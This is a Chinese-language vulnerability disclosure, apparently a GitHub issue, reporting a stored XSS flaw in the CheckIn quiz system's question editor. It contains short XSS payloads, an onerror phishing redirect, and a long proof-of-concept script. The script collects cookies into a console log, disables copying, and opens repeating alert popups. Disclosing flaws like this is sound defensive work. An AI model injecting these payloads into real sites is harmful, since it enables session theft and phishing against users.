# 安全问题报告函:出题端出题存在HTML/JS代码注入安全漏洞
致CheckIn开源项目开发团队（Etern-34520）：

您好！本人在对CheckIn（Web入群测试系统，[项目地址](https://github.com/Etern-34520/CheckIn/)
进行功能测试与安全核查时，发现该项目**出题端出题存在HTML/JS代码注入安全漏洞**，该漏洞可能导致前端页面展示异常、恶意脚本执行、用户信息泄露甚至服务器端安全风险，现特将问题详情、影响范围及修复建议反馈如下，望团队予以重视并及时处理。

## 一、漏洞基本信息
1. **漏洞类型**：跨站脚本攻击（XSS）- 存储型XSS（HTML/JS代码注入）
2. **出现位置**：项目出题端的题目内容编辑/输入栏
3. **触发条件**：出题者在出题栏中输入/粘贴完整的HTML标签、JavaScript脚本代码等内容并保存题目，该内容在答题端、管理端等页面展示时未做任何过滤与转义处理，直接被浏览器解析执行。
4. **项目版本**：基于项目最新提交记录（2026年2月13日）及公开技术文档核查，当前公开版本均存在该漏洞。

## 二、漏洞详细描述
CheckIn项目支持出题端自定义题目内容，且官方说明中提及**题目内容支持Markdown格式**，但未对出题栏输入的内容做HTML标签、JS脚本的过滤、转义与校验处理。
当出题者（含拥有出题权限的所有用户）在题目内容栏中输入完整的HTML/JS代码（例如`<script>alert('恶意注入')</script>`、`<iframe src="恶意地址"></iframe>`、`<img src=x onerror=window.location.href='钓鱼地址'>`等）并保存题目后，该代码会被系统直接存储至数据库中。当答题者访问答题页面、管理员在后台查看题目/答题记录时，系统会将未做处理的代码直接渲染至前端页面，浏览器会自动解析并执行注入的HTML/JS代码，从而触发漏洞。

## 三、漏洞影响范围与危害
### （一）影响范围
1. 所有使用该项目的部署实例，包括官方DEMO、个人/团队自建的CheckIn系统；
2. 所有访问存在注入代码题目的答题者（前端页面受影响）；
3. 所有在管理端查看该类题目的系统管理员（后台管理页面受影响）；
4. 若漏洞被恶意利用，可能通过脚本获取用户Cookie、SessionID等信息，进一步影响服务器端安全。

### （二）具体危害
1. **前端页面异常**：注入的HTML代码会破坏页面原有布局、样式，导致答题/管理页面无法正常展示，影响系统使用；
2. **恶意脚本执行**：注入的JS脚本可执行弹窗、跳转、页面篡改等操作，干扰用户正常操作，降低系统可用性；
3. **用户信息泄露**：恶意脚本可窃取用户的浏览器Cookie、IP地址、SessionID等敏感信息，若该信息被利用，可能导致用户账号被盗、系统权限被非法获取；
4. **钓鱼与恶意引流**：通过注入跳转代码、伪造页面内容，诱导用户访问钓鱼网站、恶意网站，造成二次危害；
5. **服务器端潜在风险**：若结合其他漏洞，攻击者可通过脚本进一步发起跨站请求伪造（CSRF）等攻击，尝试操作服务器端数据，威胁系统数据安全。

此外，项目支持**多用户和权限控制**，若低权限出题用户利用该漏洞，可对高权限管理员及所有答题者发起攻击，漏洞的传播性与危害会进一步扩大。

## 四、漏洞复现步骤
为便于团队核查与复现，现将核心步骤说明如下：
1. 部署CheckIn项目并使用管理员账号登录后台管理端（出题端）；
2. 进入题库管理模块，新建选择题/题组，在**题目内容栏**中输入测试注入代码，如下：
<img width="2088" height="1206" alt="f9c0aefd-7e6c-40c2-a80e-4878a32565cb" src="https://github.com/user-attachments/assets/c16c57d2-ffc4-4ad1-9ffe-1a62119d1d7f" />

```
Heil！（本字也要粘贴）
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CheckIn项目 HTML/JS注入漏洞示例</title>
    <style>
        /* 恶意样式：篡改整个页面布局和样式 */
        body {
            margin: 0 !important;
            padding: 0 !important;
            background: linear-gradient(90deg, #ff0000, #00ff00, #0000ff) !important;
            font-family: "微软雅黑", sans-serif !important;
            animation: shake 0.5s infinite !important;
        }
        /* 页面抖动动画：干扰用户操作 */
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(0); }
            75% { transform: translateX(5px); }
            100% { transform: translateX(0); }
        }
        /* 恶意提示文字样式 */
        .malicious-text {
            position: fixed !important;
            top: 50% !important;
            left: 50% !important;
            transform: translate(-50%, -50%) !important;
            font-size: 48px !important;
            font-weight: bold !important;
            color: red !important;
            text-shadow: 0 0 10px #000 !important;
            z-index: 9999 !important;
            pointer-events: none !important;
        }
        /* 覆盖原有页面元素 */
        * {
            box-sizing: border-box !important;
            opacity: 0.8 !important;
        }
    </style>
</head>
<body>
    <!-- 伪装成正常题目内容的恶意代码 -->
    <div class="prompt-text">本题为安全测试题，请选择正确答案：</div>
    <script>
        // 核心恶意功能：
        // 1. 提取页面背景色并篡改
        // 2. 新增页面劫持、信息窃取、视觉干扰等恶意行为
        function maliciousCode() {
            try {
                // 1. 保留原代码的背景色提取逻辑，但篡改颜色值
                const body = document.querySelector('body');
                const originalBg = window.getComputedStyle(body).backgroundColor;
                // 篡改背景色为刺眼的渐变色（已在style中定义，此处强化）
                body.style.background = `linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #1dd1a1) !important`;
                // 2. 创建恶意提示文字，覆盖页面核心区域
                const maliciousDiv = document.createElement('div');
                maliciousDiv.className = 'malicious-text';
                maliciousDiv.innerText = '⚠️ 你的页面已被劫持！\nCheckIn存在XSS漏洞';
                document.body.appendChild(maliciousDiv);
                // 3. 模拟窃取用户信息（控制台输出，实际攻击会发送到恶意服务器）
                const userInfo = {
                    cookie: document.cookie || '无Cookie信息',
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    originalBgColor: originalBg
                };
                console.log('【恶意代码】窃取到的用户信息：', userInfo);
                // 4. 干扰页面交互：禁用右键、禁止复制、页面自动跳转（5秒后）
                document.oncontextmenu = () => false; // 禁用右键
                document.oncopy = () => false; // 禁用复制
                setTimeout(() => {
                    // 实际攻击会跳转到钓鱼网站，此处仅提示
                    alert('5秒后将跳转到恶意网站！（演示已拦截）');
                    // window.location.href = 'https://恶意网站地址.com'; 
                }, 5000);
                
            } catch (error) {
                // 异常时仍执行基础恶意操作
                document.body.style.background = '#ff0000';
                alert('XSS攻击执行失败，但页面已被篡改！');
                console.log('恶意代码执行异常：', error);
            }
        }
        // 页面加载后立即执行恶意代码（模拟答题端渲染时触发）
        window.onload = maliciousCode;
        // 额外：每隔2秒弹窗干扰用户操作
        setInterval(() => {
            alert('⚠️ 检测到XSS注入！\nCheckIn出题端未过滤HTML/JS代码');
        }, 2000);
    </script>
</body>
</html>

```
注：代码执行效果如下：

<img width="2088" height="1206" alt="488f203a-6374-4e7f-b557-df04dae894ae" src="https://github.com/user-attachments/assets/3a559fca-d133-4eb4-b5ce-b30780ed09ff" />

；
5. 保存该题目并配置至答题分区，生成答题链接；

6. 访问答题链接进入答题页面当加载对应题目时，浏览器会出现上图的执行效果，证明js运行而且对于弹窗等控制台输出报错；
7. 回到管理端查看该题目，同样会触发脚本执行，确认漏洞存在。

## 五、其他说明
1. 该漏洞为存储型XSS，属于Web应用中常见的高危安全漏洞，若及时修复，可完全避免相关安全风险；
2. 本人已完成漏洞复现，可根据团队需求提供复现截图、测试用例等补充信息；
3. 作为开源项目，CheckIn为群聊入群测试提供了便捷的解决方案，望本次漏洞修复后，项目的安全性与可用性能进一步提升。

望开发团队尽快核查该漏洞，并将修复进度同步至项目GitHub仓库，本人也将持续关注项目修复情况，若有需要可提供技术层面的协助。

此致
敬礼！

反馈人：JiuGuLiXiaoNiu
反馈日期：2026年2月24日
联系方式：Lavachicken2512@outlook.com
